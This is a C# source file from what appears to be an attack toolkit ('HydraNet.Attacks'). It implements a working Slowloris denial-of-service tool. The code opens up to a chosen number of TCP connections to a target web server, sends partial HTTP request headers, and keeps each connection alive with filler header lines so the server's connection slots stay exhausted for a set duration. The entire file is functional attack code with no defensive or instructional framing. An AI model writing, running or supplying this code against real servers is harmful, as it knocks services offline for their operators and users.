namespace HydraNet.Attacks;

using System.Net.Sockets;
using System.Text;

public sealed class SlowLoris
{
    private readonly List<TcpClient> _connections = [];
    private int _activeConnections;

    public int ActiveConnections => _activeConnections;

    public async Task ExecuteAsync(string targetHost, int targetPort, int maxConnections, int durationSeconds, CancellationToken ct)
    {
        var endTime = DateTime.UtcNow.AddSeconds(durationSeconds);

        while (DateTime.UtcNow < endTime && !ct.IsCancellationRequested)
        {
            while (_activeConnections < maxConnections && !ct.IsCancellationRequested)
            {
                try
                {
                    var client = new TcpClient();
                    await client.ConnectAsync(targetHost, targetPort, ct);
                    var stream = client.GetStream();

                    var header = $"GET / HTTP/1.1\r\nHost: {targetHost}\r\n";
                    var bytes = Encoding.ASCII.GetBytes(header);
                    await stream.WriteAsync(bytes, ct);

                    _connections.Add(client);
                    Interlocked.Increment(ref _activeConnections);
                }
                catch
                {
                    break;
                }
            }

            await KeepAliveAsync(ct);
            await Task.Delay(TimeSpan.FromSeconds(10), ct);
            PruneDeadConnections();
        }

        Cleanup();
    }

    private async Task KeepAliveAsync(CancellationToken ct)
    {
        var keepAliveHeader = Encoding.ASCII.GetBytes("X-Pad: placeholder\r\n");

        foreach (var client in _connections.ToList())
        {
            try
            {
                if (client.Connected)
                {
                    await client.GetStream().WriteAsync(keepAliveHeader, ct);
                }
            }
            catch
            {
                _connections.Remove(client);
                Interlocked.Decrement(ref _activeConnections);
            }
        }
    }

    private void PruneDeadConnections()
    {
        _connections.RemoveAll(c =>
        {
            if (!c.Connected)
            {
                Interlocked.Decrement(ref _activeConnections);
                return true;
            }
            return false;
        });
    }

    private void Cleanup()
    {
        foreach (var client in _connections)
        {
            client.Dispose();
        }
        _connections.Clear();
        _activeConnections = 0;
    }
}
